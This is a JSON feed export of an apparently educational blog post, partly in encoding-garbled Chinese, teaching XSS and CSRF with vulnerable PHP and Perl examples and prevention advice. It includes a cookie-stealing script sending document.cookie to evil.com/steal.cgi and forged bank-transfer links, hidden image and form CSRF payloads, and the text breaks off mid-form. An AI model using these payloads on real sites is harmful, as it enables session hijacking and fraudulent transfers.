{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"csrf\" tag",
    "description": "ğŸŒ¸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/course/Cross-Site-attack/",
            "url": "http://example.com/course/Cross-Site-attack/",
            "title": "Cross-Site attack",
            "date_published": "2024-10-30T12:31:43.000Z",
            "content_html": "<h1 id=\"Cross-Site Scripting\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Scripting\">#</a>Cross-Site Scripting</h1>\n<h2 id=\"XSS\" class=\"active\"><a class=\"anchor\"  href=\"#XSS\">#</a>XSS</h2>\n<ol>\n<li>Cross-Site Scripting (XSS)</li>\n</ol>\n<ul>\n<li>Causes arbitrary code to run in a browser that is connected to a trusted Web site\n<ul>\n<li>May occur when code returns HTML output that makes use of user inputs</li>\n<li>Trick users into clicking a hyperlink from outside the site</li>\n</ul>\n</li>\n<li>Attacks allows:\n<ul>\n<li>Disclosure of user files</li>\n<li>Installation of Trojans</li>\n<li>Redirection to other pages</li>\n<li>Trivial theft of cookies</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Basic Problem: Echoing Untrusted User Input<br>\nClassic mistake in a server-side application with URL  <code>http://naive.com/search.php?term=justin+bieber</code> <br>\nPHP at search.php responds with</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;&lt;title&gt;Search results&lt;/title&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">   You have searched for </span><br><span class=\"line\">   &lt;?php echo $_GET[&#x27;term&#x27;] ?&gt; </span><br><span class=\"line\">   ...  </span><br><span class=\"line\"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>åœ¨è¿™é‡Œï¼Œ <code>$_GET['term']</code>  çš„å†…å®¹ç›´æ¥è¢«åµŒå…¥åˆ° HTML ä¸­è¿›è¡Œå›æ˜¾ã€‚å¦‚æœ  <code>$_GET['term']</code>  åŒ…å«æ¶æ„çš„ HTML æˆ– JavaScript ä»£ç ï¼Œåˆ™å¯èƒ½å¼•å‘è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ã€‚<br>\n3. Dangerous HTML Inputs<br>\n <code>&lt;script&gt;alert(&quot;Boo!&quot;)&lt;/script&gt;</code> <br>\n æ­¤ä»£ç å¼¹å‡ºä¸€ä¸ªè­¦å‘Šå¯¹è¯æ¡†ï¼Œè¯æ˜ XSS æ”»å‡»æ˜¯å¯èƒ½çš„ã€‚<br>\n <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> <br>\n æ­¤ä»£ç ä¼šæ‰“å°å½“å‰é¡µé¢çš„ Cookie ä¿¡æ¯ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šçªƒå–ç”¨æˆ·çš„ä¼šè¯ Cookieï¼Œä»è€ŒåŠ«æŒä¼šè¯ã€‚<br>\n <code>&lt;script&gt;document.write(&quot;&lt;br&gt;&quot;)&lt;/script&gt;</code> <br>\n æ­¤ä»£ç ä¼šåœ¨é¡µé¢ä¸­æ·»åŠ ä¸€ä¸ª  <code>&lt;br&gt;</code>  æ ‡ç­¾ï¼Œæ˜¾ç¤ºæ”»å‡»è€…å¯ä»¥æ›´æ”¹ç½‘é¡µå†…å®¹ã€‚<br>\n <code>&lt;script&gt;window.location='http://google.com'&lt;/script&gt;</code> <br>\n æ­¤ä»£ç ä¼šå°†å½“å‰ç½‘é¡µé‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥å°†ç”¨æˆ·å¯¼å‘æ¶æ„ç«™ç‚¹<br>\n 4. Main Types of Cross-Site Scripting Attacks<br>\n1.  Stored (persistent)<br>\n2.  Reflected (non-persistent)</p>\n<h2 id=\"Stored (Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Stored (Persistent) XSS Attacks\">#</a>Stored (Persistent) XSS Attacks</h2>\n<ol>\n<li>Data supplied by an attacker is <strong>permanently stored</strong> on a server and displayed to other users when browsing without being properly sanitised<br>\nIf the user input is displayed in the page\n<ul>\n<li>HTML tags can mess up the look of the page</li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour</li>\n<li>For the current user or other users<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/67222f628055d.png\" alt=\"img\"></li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight perl\"><figcaption><span>Example Vulnerable Guestbook Program</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!perl</span></span><br><span class=\"line\"> <span class=\"comment\"># Fig. 19.6: fig19_06.pl</span></span><br><span class=\"line\"> <span class=\"comment\"># Guestbook program.</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">use</span> warnings;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> strict;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> CGI <span class=\"string\">qw( :standard )</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( header(), start_html( <span class=\"string\">&quot;Guestbook&quot;</span> ), h1( <span class=\"string\">&quot;Guestbook&quot;</span> ));</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( param() ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> h3( <span class=\"string\">&quot;Thank you for signing our guestbook!!!&quot;</span> ),</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$name</span> = param( <span class=\"string\">&quot;name&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$email</span> = param( <span class=\"string\">&quot;email&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$message</span> = param( <span class=\"string\">&quot;message&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;&gt;&gt;guestbook.log&quot;</span> ) <span class=\"keyword\">or</span>   //Open the guestbook file</span><br><span class=\"line\">       <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">print</span>( FILE, <span class=\"string\">&quot;\\n&quot;</span>, hr(), <span class=\"string\">&quot;From: &quot;</span>, </span><br><span class=\"line\">       a( &#123; <span class=\"string\">-href =&gt;</span> <span class=\"string\">&quot;mailto:<span class=\"variable\">$email</span>&quot;</span> &#125;, <span class=\"variable\">$name</span> ), br(), br(),</span><br><span class=\"line\">       <span class=\"variable\">$message</span> );    <span class=\"regexp\">//</span> Store the user entered data in the guestbook file</span><br><span class=\"line\">    <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;guestbook.log&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );   <span class=\"regexp\">//</span>Open the guestbook file</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span> <span class=\"keyword\">while</span> ( &lt;FILE&gt; );      <span class=\"regexp\">//</span>Display the contents of the guestbook file</span><br><span class=\"line\"> <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( h4( <span class=\"string\">&quot;Please sign our guestbook:&quot;</span> ), start_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;Name: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;name&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;E-mail: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;email&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;Enter your message:&quot;</span>, br(),</span><br><span class=\"line\">     textarea( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;message&quot;</span>, <span class=\"string\">-rows =&gt;</span> <span class=\"number\">5</span>, <span class=\"string\">-columns =&gt;</span> <span class=\"number\">50</span>, <span class=\"string\">-wrap =&gt;</span> <span class=\"number\">1</span> ),</span><br><span class=\"line\">     br(), submit( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;Sign the Guestbook&quot;</span> ), end_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     end_html() );</span><br></pre></td></tr></table></figure>\n<p>è¯¥ Perl è„šæœ¬æ˜¯ä¸€ä¸ªåŸºæœ¬çš„è®¿å®¢ç•™è¨€ç°¿ç¨‹åºï¼Œå…è®¸ç”¨æˆ·è¾“å…¥å§“åã€ç”µå­é‚®ä»¶å’Œæ¶ˆæ¯å¹¶å°†å…¶ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ (guestbook.log) ä¸­ã€‚ç¨‹åºè¿˜å¯ä»¥è¯»å–å¹¶æ˜¾ç¤ºæ—¥å¿—æ–‡ä»¶çš„å†…å®¹</p>\n<ul>\n<li>ç”¨æˆ·è¾“å…¥æœªè¿‡æ»¤ï¼šç¨‹åºç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥æ¥ç”Ÿæˆ HTML è¾“å‡ºå’Œå†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–è½¬ä¹‰ï¼Œå®¹æ˜“å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚\n<ul>\n<li>ä¾‹å¦‚ï¼Œç”¨æˆ·åœ¨  <code>name</code>  æˆ–  <code>message</code>  è¾“å…¥å­—æ®µä¸­æ’å…¥  <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> ï¼Œè¿™æ®µæ¶æ„ä»£ç å°†ä¼šåœ¨å…¶ä»–ç”¨æˆ·æŸ¥çœ‹ç•™è¨€ç°¿æ—¶è¢«æ‰§è¡Œã€‚</li>\n<li>æˆ–æ˜¯åœ¨ç•™è¨€æ—¶æ’å…¥ HTML æ”¹å˜é¡µé¢å¸ƒå±€</li>\n</ul>\n</li>\n<li>æ—¥å¿—æ–‡ä»¶çš„å¯å†™æ€§ï¼š<br>\nç¨‹åºå°†ç”¨æˆ·çš„è¾“å…¥é™„åŠ åˆ°æ—¥å¿—æ–‡ä»¶ guestbook.logï¼Œä½†æ²¡æœ‰éªŒè¯æ–‡ä»¶æ˜¯å¦å­˜åœ¨æˆ–æ˜¯å¦å·²è¢«ä¿®æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶ç¯¡æ”¹æˆ–è¦†ç›–æ”»å‡»ã€‚<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/6722340e28890.png\" alt=\"img\"></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png\" alt=\"Image 1\"></th>\n<th style=\"text-align:center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png\" alt=\"Image 2\"></th>\n</tr>\n</thead>\n</table>\n<h2 id=\"Reflected (Non-Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Reflected (Non-Persistent) XSS Attacks\">#</a>Reflected (Non-Persistent) XSS Attacks</h2>\n<ol>\n<li>Data supplied by an attacker is displayed in the response page <strong>without being stored on a server</strong><br>\nIf the user input is displayed in the page\n<ul>\n<li>HTML tags can mess up the look of the page</li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour</li>\n<li>For only the current user</li>\n</ul>\n</li>\n<li>Example<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672236eb773d1.png\" alt=\"img\"></li>\n</ol>\n<ul>\n<li>æ¶æ„ç½‘é¡µï¼ˆ<span class=\"exturl\" data-url=\"aHR0cDovL2V2aWwuY29t\">evil.com</span>ï¼‰<br>\næ”»å‡»è€…åœ¨  <code>evil.com</code>  ä¸Šåˆ›å»ºäº†ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ç½‘é¡µã€‚<br>\né¡µé¢ä¸­åŒ…å«äº†ä¸€ä¸ªæŒ‡å‘ç›®æ ‡ç½‘ç«™çš„é“¾æ¥æˆ–è¡¨å•ï¼Œå…¶ä¸­å«æœ‰æ¶æ„çš„ JavaScript ä»£ç ã€‚ä¾‹å¦‚ï¼š</li>\n</ul>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://naive.com/hello.cgi?name=&lt;script&gt;win.open(&#x27;http://evil.com/steal.cgi?cookie=&#x27; + document.cookie)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>é“¾æ¥ä¸­çš„  <code>name</code>  å‚æ•°æ˜¯ç”¨æ¥æ³¨å…¥ JavaScript ä»£ç çš„ã€‚ä»£ç è¯•å›¾å°†ç”¨æˆ·çš„  <code>cookie</code>  ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆå³  <code>evil.com</code>  çš„  <code>steal.cgi</code>  è„šæœ¬ï¼‰ã€‚</p>\n<ul>\n<li>å—å®³è€…ç‚¹å‡»äº†æ¶æ„é“¾æ¥å¹¶è®¿é—®äº†ç›®æ ‡ç½‘é¡µã€‚<br>\næµè§ˆå™¨å‘ <span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span> å‘é€è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ name å‚æ•°ã€‚è¯·æ±‚çš„æ ·å¼ä¸ºï¼š</li>\n</ul>\n<figure class=\"highlight javascript\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> /hello.<span class=\"property\">cgi</span>?name=<span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>ç›®æ ‡ç½‘ç«™ï¼ˆ<span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span>ï¼‰<br>\nç›®æ ‡ç½‘ç«™ <span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span> å°†ç”¨æˆ·è¾“å…¥çš„ name å‚æ•°åŸå°ä¸åŠ¨åœ°åµŒå…¥åˆ°äº†å“åº”çš„ HTML é¡µé¢ä¸­ã€‚å“åº”é¡µé¢å¯èƒ½æ˜¯è¿™æ ·ï¼š</li>\n</ul>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span>&gt;</span>Hello, dear </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>. Welcome!<span class=\"tag\">&lt;/<span class=\"name\">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç”±äºæœªå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæµè§ˆå™¨å°†  <code>script</code>  æ ‡ç­¾ä½œä¸ºæ™®é€šçš„ JavaScript ä»£ç æ‰§è¡Œã€‚</p>\n<ul>\n<li>ç»“æœ<br>\næµè§ˆå™¨æ‰§è¡Œäº†æ¶æ„ JavaScript ä»£ç ï¼Œæ‰“å¼€äº†ä¸€ä¸ªæ–°çš„çª—å£å¹¶å‘  <code>evil.com/steal.cgi</code>  å‘é€äº†ç”¨æˆ·çš„  <code>cookie</code>  ä¿¡æ¯ã€‚<br>\næ”»å‡»è€…é€šè¿‡è¿™ç§æ–¹å¼è·å–äº†å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚èº«ä»½éªŒè¯ cookieï¼‰ï¼Œå¹¶å¯èƒ½è¿›ä¸€æ­¥è¿›è¡Œä¼šè¯åŠ«æŒã€‚<br>\nè¿ååŒæºç­–ç•¥ï¼ˆSOPï¼‰ï¼šåŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰æ—¨åœ¨ä¿æŠ¤ç”¨æˆ·çš„æµè§ˆå™¨ä¸è¢«æ¶æ„è„šæœ¬è·¨ç«™æ”»å‡»ï¼ŒXSS æ”»å‡»ç›´æ¥è¿åäº†è¿™ä¸€ç­–ç•¥</li>\n</ul>\n<ol start=\"3\">\n<li>Reflected XSS Attack Details</li>\n</ol>\n<ul>\n<li>User is tricked into visiting an honest website</li>\n<li>Bug in website code causes userâ€™s browser to execute an arbitrary attack script\n<ul>\n<li>The origin of this script is now the website itself</li>\n</ul>\n</li>\n<li>Script can request sensitive data, control form fields on this page and linked pages\n<ul>\n<li>Can cause userâ€™s browser to attack other websites<br>\nExample: <span class=\"exturl\" data-url=\"aHR0cDovL015U3BhY2UuY29t\">MySpace.com</span> phishing attack injects a fake password field that sends password to attacker</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Stored XSS VS Reflected XSS\" class=\"active\"><a class=\"anchor\"  href=\"#Stored XSS VS Reflected XSS\">#</a>Stored XSS VS Reflected XSS</h2>\n<table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>å­˜å‚¨å‹ XSS (Stored XSS)</th>\n<th>åå°„å‹ XSS (Reflected XSS)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ä»£ç å­˜å‚¨</td>\n<td>æœåŠ¡å™¨ç«¯æŒä¹…å­˜å‚¨</td>\n<td>ä»…åœ¨è¯·æ±‚ä¸­åå°„</td>\n</tr>\n<tr>\n<td>æŒä¹…æ€§</td>\n<td>æŒä¹…æ€§ï¼Œå½±å“æ›´å¤šç”¨æˆ·</td>\n<td>éæŒä¹…æ€§ï¼Œé€šå¸¸åªå½±å“ç‰¹å®šç”¨æˆ·</td>\n</tr>\n<tr>\n<td>æ”»å‡»æ‰‹æ®µ</td>\n<td>åˆ©ç”¨æŒä¹…å­˜å‚¨ï¼ˆå¦‚æ•°æ®åº“ã€æ—¥å¿—ã€æ–‡ä»¶ç­‰ï¼‰</td>\n<td>é€šè¿‡æ¶æ„é“¾æ¥æˆ–è¡¨å•æäº¤è¯±å¯¼ç”¨æˆ·</td>\n</tr>\n<tr>\n<td>ç¤ºä¾‹åœºæ™¯</td>\n<td>è¯„è®ºåŒºã€è®ºå›å¸–å­ã€åšå®¢æ–‡ç« ã€ç”¨æˆ·ç®€ä»‹ç­‰</td>\n<td>é’“é±¼é‚®ä»¶ã€æ¶æ„é“¾æ¥ã€æœç´¢æŸ¥è¯¢ç­‰</td>\n</tr>\n<tr>\n<td>ä¿®å¤éš¾åº¦</td>\n<td>éš¾åº¦è¾ƒå¤§ï¼Œéœ€æ¸…ç†æœåŠ¡å™¨ä¸Šçš„æ¶æ„ä»£ç </td>\n<td>éš¾åº¦è¾ƒå°ï¼Œå¯é€šè¿‡è¾“å…¥éªŒè¯å’Œè½¬ä¹‰å¿«é€Ÿä¿®å¤</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Preventing XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Preventing XSS Attacks\">#</a>Preventing XSS Attacks</h2>\n<ol>\n<li>Input Filtering<br>\n è¿˜æ²¡æ‡‚å…ˆæ”¾ä¸ªé“¾æ¥åœ¨è¿™<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==\"> XSS Filter Evasion Cheat Sheet</span></li>\n<li>Framework validation</li>\n<li>Output Sanitisation</li>\n</ol>\n<ul>\n<li>Any user input and client-side data must be preprocessed before it is used inside HTML\n<ul>\n<li>PHP:  <code>htmlspecialchars(string)</code>  replaces all special characters with their HTML code ä¾‹å¦‚ï¼Œå°†  <code>&lt;</code>  è½¬æ¢ä¸º  <code>&amp;lt;</code> ï¼Œ <code>&gt;</code>  è½¬æ¢ä¸º  <code>&amp;gt;</code> ï¼Œä»¥é˜²æ­¢è¿™äº›å­—ç¬¦è¢«æµè§ˆå™¨è§£é‡Šä¸º HTML æˆ–è„šæœ¬æ ‡ç­¾ã€‚</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL0FTUC5ORVQ=\">ASP.NET</span>:  <code>Server.HtmlEncode(string)</code>  è¯¥æ–¹æ³•ä¼šå°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œç¡®ä¿æµè§ˆå™¨ä¸ä¼šå°†å…¶è§£é‡Šä¸ºå¯æ‰§è¡Œä»£ç ã€‚</li>\n</ul>\n</li>\n<li>è¿‡æ»¤å¯èƒ½ä¼šå°†è¾“å…¥è½¬æ¢æˆæ”»å‡»å½¢å¼\n<ul>\n<li>å¦‚æœé¢„å¤„ç†è¿‡ç¨‹ä¸­æœªå½»åº•æ¶ˆé™¤æ‰€æœ‰æ½œåœ¨å¨èƒï¼Œæœ‰å¯èƒ½ä»ä¼šå¯¼è‡´ XSS ç­‰æ”»å‡»ã€‚</li>\n<li>éœ€è¦åœ¨è¿‡æ»¤åå¤šæ¬¡å¾ªç¯æ£€æŸ¥ï¼Œå¹¶åœ¨æ£€æµ‹åˆ°æ¶æ„å†…å®¹æ—¶é‡æ–°åº”ç”¨è¿‡æ»¤ï¼Œç›´åˆ°ä¸å†å‘ç°æ½œåœ¨å¨èƒä¸ºæ­¢ã€‚</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Cross-Site Request Forgery\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Request Forgery\">#</a>Cross-Site Request Forgery</h1>\n<h2 id=\"CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#CSRF\">#</a>CSRF</h2>\n<ol>\n<li>Cross-Site Request Forgery (CSRF)</li>\n</ol>\n<ul>\n<li>A privileged user is tricked to perform an operation on the behalf of an attacker\n<ul>\n<li>Often through social engineering (such as sending a link via email or chat)</li>\n</ul>\n</li>\n<li>Usually unnoticed by the victim user\n<ul>\n<li>Requests are sent by the browser behind the scenes</li>\n</ul>\n</li>\n<li>CSRF exploits the trust that a web site has in a userâ€™s browser\n<ul>\n<li>XSS exploits the trust a user has for a particular site</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Characteristics of CSRF</li>\n</ol>\n<ul>\n<li>Web sites rely on a userâ€™s identity</li>\n<li>The site has trust in that identity</li>\n<li>The userâ€™s browser is tricked into sending HTTP requests to a target site</li>\n<li>Such HTTP requests have side effects\n<ul>\n<li>Because the attacker doesnâ€™t receive the response</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Example\" class=\"active\"><a class=\"anchor\"  href=\"#Example\">#</a>Example</h2>\nExample Descriptionï¼š\nAlice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: \n<ul>\n<li>Build an exploit URL or script</li>\n<li>Trick Alice into executing the action with social engineering</li>\n</ul>\n<ol>\n<li>Example: GET<br>\nA GET request from Alice to transfer money to Bob</li>\n</ol>\n<figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> <span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">BOB</span>&amp;amount=<span class=\"number\">100</span> <span class=\"variable constant_\">HTTP</span>/<span class=\"number\">1.1</span></span><br></pre></td></tr></table></figure>\n<p>Charlie first forges the following exploit URL</p>\n<figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">CHARLIE</span>&amp;amount=<span class=\"number\">100000</span></span><br></pre></td></tr></table></figure>\n<p>Then, Charlie tricks Alice into loading this URL <strong>when Alice is logged into the bank</strong> ä¾‹å¦‚é€šè¿‡å‘é€æ¶æ„ç”µå­é‚®ä»¶æˆ–åœ¨å…¶ä»–ç½‘ç«™ä¸Šç§æ¤æ¶æ„é“¾æ¥ã€‚</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span>&gt;</span>æŸ¥çœ‹æˆ‘çš„å›¾ç‰‡ï¼<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>æˆ–</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>Example: POST<br>\nA POST request from Alice to transfer money to Bob</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> acct=BOB&amp;amount=100</span><br></pre></td></tr></table></figure>\n<p>Charlie first crafts some hidden FORM tags</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;acct&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;CHARLIE&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span 